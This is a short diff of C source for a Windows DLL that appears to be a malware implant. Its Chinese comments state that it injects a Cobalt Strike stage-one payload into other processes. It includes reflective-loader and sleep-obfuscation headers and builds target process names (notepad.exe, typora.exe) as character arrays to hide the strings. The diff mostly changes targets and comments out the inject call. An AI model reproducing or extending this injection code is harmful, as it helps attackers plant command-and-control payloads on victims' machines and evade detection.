@@ -1,5 +1,6 @@
 ﻿#include "pch.h"
 #include "framework.h"
+#include "rfdll.h"
 #include "types.h"
 #include "headers.h"
 #include "misc.h"
@@ -8,11 +9,11 @@
 #include "swappala.h"
 #include "sleaping.h"
 #include <stdint.h>
-#include "mylibc.h"
 #include "net.h"
 #include "utils.h"
 #include "file.h"
 #include "dll_headers.h"
+#include "ldr.h"
 
 typedef struct _SAC_DLL_HEADER
 {
@@ -23,7 +24,7 @@ typedef struct _SAC_DLL_HEADER
 
 } SAC_DLL_HEADER, * PSAC_DLL_HEADER;
 
-uintptr_t resolve_jmp_to_actual_function(void* func_addr)
+static uintptr_t resolve_jmp_to_actual_function(void* func_addr)
 {
 	if (!func_addr) return 0;
 
@@ -700,11 +701,10 @@ static status_t custom_process_attach(HMODULE hModule)
 	//	return FALSE;
 
 	// 向其他进程注入CS的一阶段载荷
-	// 拓展：可以让该DLL持久存在与进程中，并尝试向其他进程中注入各种恶意代码
- //   WCHAR str_notepad[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', L'\0' };
-    WCHAR str_typora[] = { 't', 'y', 'p', 'o', 'r', 'a', '.', 'e', 'x', 'e', L'\0' };
+    WCHAR str_target[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', L'\0' };
 	//WCHAR str_explorer[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', L'\0' };
-	inject(&nt_funcs, str_typora);
+
+	//inject(&nt_funcs, str_target);
 
 
 
